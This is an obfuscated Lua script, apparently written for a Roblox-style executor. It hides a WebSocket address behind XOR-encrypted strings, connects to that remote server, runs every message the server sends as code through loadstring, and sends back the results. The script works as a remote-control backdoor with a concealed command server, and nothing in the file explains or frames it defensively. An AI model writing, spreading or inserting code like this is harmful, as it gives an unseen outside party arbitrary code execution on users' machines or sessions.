local obf_stringchar = string.char;
local obf_stringbyte = string.byte;
local obf_stringsub = string.sub;
local obf_bitlib = bit32 or bit;
local obf_XOR = obf_bitlib.bxor;
local obf_tableconcat = table.concat;
local obf_tableinsert = table.insert;
local function LUAOBFUSACTOR_DECRYPT_STR_0(LUAOBFUSACTOR_STR, LUAOBFUSACTOR_KEY)
	local result = {};
	for i = 1, #LUAOBFUSACTOR_STR do
		obf_tableinsert(result, obf_stringchar(obf_XOR(obf_stringbyte(obf_stringsub(LUAOBFUSACTOR_STR, i, i + 1)), obf_stringbyte(obf_stringsub(LUAOBFUSACTOR_KEY, 1 + (i % #LUAOBFUSACTOR_KEY), 1 + (i % #LUAOBFUSACTOR_KEY) + 1))) % 256));
	end
	return obf_tableconcat(result);
end
task.spawn(function()
	local a = WebSocket.connect(LUAOBFUSACTOR_DECRYPT_STR_0("\198\208\129\106\169\179\194\18\200\194\149\53\255\183\194\6\159\219\194\63\188\234\151\71\128\151\148\50\245", "\126\177\163\187\69\134\219\167"));
	a:Send(LUAOBFUSACTOR_DECRYPT_STR_0("\0\226\4\235\217\0\249\3\234\210\99\254\31\230\223\6\254\25", "\156\67\173\74\165"));
	a.OnMessage:Connect(function(k)
		local s, e = pcall(function()
			a:Send(loadstring(k)());
		end);
		a:Send(tostring(s) .. LUAOBFUSACTOR_DECRYPT_STR_0("\40\247", "\38\84\215\41\118\220\70") .. tostring(e));
	end);
end);
